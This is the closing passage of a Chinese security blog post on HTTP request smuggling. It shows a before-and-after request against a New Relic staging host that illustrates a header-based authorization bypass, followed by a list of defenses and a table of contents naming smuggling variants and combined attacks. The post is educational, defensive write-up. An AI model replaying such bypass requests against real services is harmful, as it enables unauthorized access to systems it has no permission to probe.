<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /revision_check HTTP/1.1Host: staging-alerts.newrelic.comX-Forwarded-Proto: httpsHTTP/1.1 200 OKNot authorized with header:</span><br></pre></td></tr></table></figure>
<p>修改后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...GET /revision_check HTTP/1.1Host: staging-alerts.newrelic.comX-Forwarded-Proto: httpsX-nr-external-service: 1HTTP/1.1 403 ForbiddenForbidden</span><br></pre></td></tr></table></figure>
<h2 id="0x07-防御方法"><a href="#0x07-防御方法" class="headerlink" title="0x07 防御方法"></a>0x07 防御方法</h2><ul>
<li>使用HTTP2.0协议，其本身会对请求进行隔离，不存在HRS问题；</li>
<li>禁止前端服务器与后端服务器之间的TCP连接重用，保证不同用户不会复用同一个TCP连接；</li>
<li>前后端使用相同的服务器；</li>
<li>后端服务器需要对所有的请求字段做严格的校验，尤其是需要对备注类的头字段；</li>
<li>后端服务器需要针对敏感页面开启CSP；</li>
</ul>

    </div>

  </article>
  <div class="toc-container">
    
  <div id="toc" class="toc-article">
    <strong class="toc-title">目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-参考"><span class="toc-text">0x00 参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-HRS简介"><span class="toc-text">0x01 HRS简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-漏洞原理"><span class="toc-text">0x02 漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞场景"><span class="toc-text">漏洞场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#两个HTTP头字段"><span class="toc-text">两个HTTP头字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二义性造就HRS"><span class="toc-text">二义性造就HRS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-漏洞类型"><span class="toc-text">0x03 漏洞类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CL-TE"><span class="toc-text">CL.TE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TE-CL"><span class="toc-text">TE.CL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TE-TE"><span class="toc-text">TE.TE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CL-CL"><span class="toc-text">CL.CL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-漏洞案例与组合拳"><span class="toc-text">0x04 漏洞案例与组合拳</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CL-TE-1"><span class="toc-text">CL.TE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TE-CL-1"><span class="toc-text">TE.CL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TE-TE-1"><span class="toc-text">TE.TE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过前端服务器的安全控制"><span class="toc-text">绕过前端服务器的安全控制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CL-TE场景绕过"><span class="toc-text">CL.TE场景绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TE-CL场景绕过"><span class="toc-text">TE.CL场景绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取前端服务器重写请求字段"><span class="toc-text">获取前端服务器重写请求字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取其他用户的请求"><span class="toc-text">获取其他用户的请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#组合反射型XSS"><span class="toc-text">组合反射型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#组合Web缓存投毒攻击"><span class="toc-text">组合Web缓存投毒攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-BurpSuite的HRS扫描原理"><span class="toc-text">0x05 BurpSuite的HRS扫描原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CL-TE型HRS扫描原理"><span class="toc-text">CL.TE型HRS扫描原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TE-CL型HRS扫描原理"><span class="toc-text">TE.CL型HRS扫描原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网上参考的脚本"><span class="toc-text">网上参考的脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-Bypass技巧"><span class="toc-text">0x06 Bypass技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#混淆TE头"><span class="toc-text">混淆TE头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#设置X-Forwarded-Proto以解决无法HTTP发送的问题"><span class="toc-text">设置X-Forwarded-Proto以解决无法HTTP发送的问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#设置X-nr-external-service授权标头"><span class="toc-text">设置X-nr-external-service授权标头</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-防御方法"><span class="toc-text">0x07 防御方法</span></a></li></ol>
  </div>


  </div>
</div>
<div class="copyright">
    <span>本作品采用</span>
    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
    <span>进行许可。 转载时请注明原文链接。</span>
</div>


  
    <div class="post-nav">
      <div class="post-nav-item post-nav-next">
        
          <span>〈 </span>
          <a href="/2020/03/09/Python-urllib-CRLF注入漏洞小结/" rel="next" title="Python urllib CRLF注入漏洞小结">
          Python urllib CRLF注入漏洞小结
          </a>
        
      </div>
  
      <div class="post-nav-item post-nav-prev">
          
          <a href="/2020/03/16/OGNL表达式注入漏洞总结/" rel="prev" title="OGNL表达式注入漏洞总结">
            OGNL表达式注入漏洞总结
          </a>
          <span>〉</span>
        
      </div>
    </div>
  


    </div>

    
    

  </div>
  <footer class="footer text-center">
    <div id="bottom-inner">
        <span>Copyright &copy; Mi1k7ea</span>  |  
        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
    </div>
</footer>

  

<script>
  (function(window, document, undefined) {

    var timer = null;

    function returnTop() {
      cancelAnimationFrame(timer);
      timer = requestAnimationFrame(function fn() {
        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
        if (oTop > 0) {
          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
          timer = requestAnimationFrame(fn);
        } else {
          cancelAnimationFrame(timer);
        }
      });
    }

    var hearts = [];
    window.requestAnimationFrame = (function() {
      return window.requestAnimationFrame ||
        window.webkitRequestAnimationFrame ||
        window.mozRequestAnimationFrame ||
        window.oRequestAnimationFrame ||
        window.msRequestAnimationFrame ||
        function(callback) {
          setTimeout(callback, 1000 / 60);
        }
    })();
    init();

    function init() {
      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
      attachEvent();
      gameloop();
      addMenuEvent();
    }

    function gameloop() {
      for (var i = 0; i < hearts.length; i++) {
        if (hearts[i].alpha <= 0) {
          document.body.removeChild(hearts[i].el);
          hearts.splice(i, 1);
          continue;
        }
        hearts[i].y--;
        hearts[i].scale += 0.004;
        hearts[i].alpha -= 0.013;
        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
      }
      requestAnimationFrame(gameloop);
    }

    /**
     * 给logo设置点击事件
     * 
     * - 回到顶部
     * - 出现爱心
     */
    function attachEvent() {
      var old = typeof window.onclick === "function" && window.onclick;
      var logo = document.getElementById("logo");
      if (logo) {
        logo.onclick = function(event) {
          returnTop();
          old && old();
          createHeart(event);
        }
      }
      
    }

    function createHeart(event) {
      var d = document.createElement("div");
      d.className = "heart";
      hearts.push({
        el: d,
        x: event.clientX - 5,
        y: event.clientY - 5,
        scale: 1,
        alpha: 1,
        color: randomColor()
      });
      document.body.appendChild(d);
    }

    function css(css) {
      var style = document.createElement("style");
      style.type = "text/css";
      try {
        style.appendChild(document.createTextNode(css));
      } catch (ex) {
        style.styleSheet.cssText = css;
      }
      document.getElementsByTagName('head')[0].appendChild(style);
    }

    function randomColor() {
      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
      return "#F44336";
    }

    function addMenuEvent() {
      var menu = document.getElementById('menu-main-post');
      if (menu) {
        var toc = document.getElementById('toc');
        if (toc) {
          menu.onclick = function() {
            if (toc) {
              if (toc.style.display == 'block') {
                toc.style.display = 'none';
              } else {
                toc.style.display = 'block';
              }
            }
          };
        } else {
          menu.style.display = 'none';
        }
      }
    }

  })(window, document);
</script>

  



  
<script>
  (function(){
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      if (curProtocol === 'https') {
          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      }
      else {
          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
  })();
</script>


</body>
</html>
